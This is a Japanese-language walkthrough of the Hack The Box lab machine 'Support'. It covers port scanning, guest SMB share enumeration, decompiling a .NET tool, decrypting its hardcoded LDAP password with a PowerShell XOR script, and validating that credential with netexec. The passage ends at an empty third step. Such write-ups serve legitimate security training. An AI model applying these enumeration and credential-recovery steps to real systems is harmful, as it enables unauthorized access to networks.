https://app.hackthebox.com/machines/Support

##  STEP 1
```sh
└─$ rustscan -a 10.129.230.181 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.230.181:53
Open 10.129.230.181:88
Open 10.129.230.181:135
Open 10.129.230.181:139
Open 10.129.230.181:389
Open 10.129.230.181:445
Open 10.129.230.181:464
Open 10.129.230.181:593
Open 10.129.230.181:636
Open 10.129.230.181:3268
Open 10.129.230.181:3269
Open 10.129.230.181:5985
Open 10.129.230.181:9389
Open 10.129.230.181:49664
Open 10.129.230.181:49667
Open 10.129.230.181:49678
Open 10.129.230.181:49683
Open 10.129.230.181:49707
10.129.230.181 -> [53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,49683,49707]
```


## STEP 2
guestでsmb列挙  
support-toolsにread権限を確認
```sh
└─$ netexec smb 10.129.230.181 -u ' ' -p '' --shares
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) 
SMB         10.129.230.181  445    DC               [+] support.htb\ : (Guest)
SMB         10.129.230.181  445    DC               [*] Enumerated shares
SMB         10.129.230.181  445    DC               Share           Permissions     Remark
SMB         10.129.230.181  445    DC               -----           -----------     ------
SMB         10.129.230.181  445    DC               ADMIN$                          Remote Admin
SMB         10.129.230.181  445    DC               C$                              Default share
SMB         10.129.230.181  445    DC               IPC$            READ            Remote IPC
SMB         10.129.230.181  445    DC               NETLOGON                        Logon server share 
SMB         10.129.230.181  445    DC               support-tools   READ            support staff tools
SMB         10.129.230.181  445    DC               SYSVOL                          Logon server share 
```
フォルダ内にファイルを複数確認したが、一般的なファイル名ではないuserinfo.exeを発見・ダウンロード
```sh
└─$ smbclient -N -c 'ls' //10.129.230.181/support-tools
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022

                4026367 blocks of size 4096. 969133 blocks available

└─$ smbget -N 'smb://10.129.230.181/support-tools/UserInfo.exe.zip'
Using domain: WORKGROUP, user: kali
smb://10.129.230.181/support-tools/UserInfo.exe.zip
Downloaded 271.00kB in 10 seconds
```
zipを展開すると、exeやdllが展開された  
userinfo.exeのファイル種別を確認すると、.net製であることを確認
```sh
└─$ unzip UserInfo.exe.zip 
Archive:  UserInfo.exe.zip
  inflating: UserInfo.exe            
  inflating: CommandLineParser.dll   
  inflating: Microsoft.Bcl.AsyncInterfaces.dll  
  inflating: Microsoft.Extensions.DependencyInjection.Abstractions.dll  
  inflating: Microsoft.Extensions.DependencyInjection.dll  
  inflating: Microsoft.Extensions.Logging.Abstractions.dll  
  inflating: System.Buffers.dll      
  inflating: System.Memory.dll       
  inflating: System.Numerics.Vectors.dll  
  inflating: System.Runtime.CompilerServices.Unsafe.dll  
  inflating: System.Threading.Tasks.Extensions.dll  
  inflating: UserInfo.exe.config

└─$ file UserInfo.exe   
UserInfo.exe: PE32 executable for MS Windows 6.00 (console), Intel i386 Mono/.Net assembly, 3 sections
```
ilspyでデコンパイル  
ユーザ名ldapでldapクエリを実行しているコードを確認  
ユーザ名ldapのパスワードは、protectedクラスから取得されているっぽい  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Support_01.png">  
protectedクラスを確認、暗号化パスワードの復号化処理を確認  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Support_02.png">  
復号化するためにをc#コードをpowershellに実装し実行  
結果、`nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`を取得
```powershell
$enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
$key = [System.Text.Encoding]::ASCII.GetBytes("armando")

$array = [System.Convert]::FromBase64String($enc_password)
$array2 = New-Object byte[] ($array.Length)

for ($i = 0; $i -lt $array.Length; $i++) {
    $array2[$i] = $array[$i] -bxor $key[$i % $key.Length] -bxor 0xDF
}

$decoded = [System.Text.Encoding]::UTF8.GetString($array2)
Write-Output $decoded
```
```sh
└─$ netexec ldap 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --groups 'Remote Management Users'
LDAP        10.129.230.181  389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
LDAP        10.129.230.181  389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
LDAP        10.129.230.181  389    DC               support
```


## STEP 3
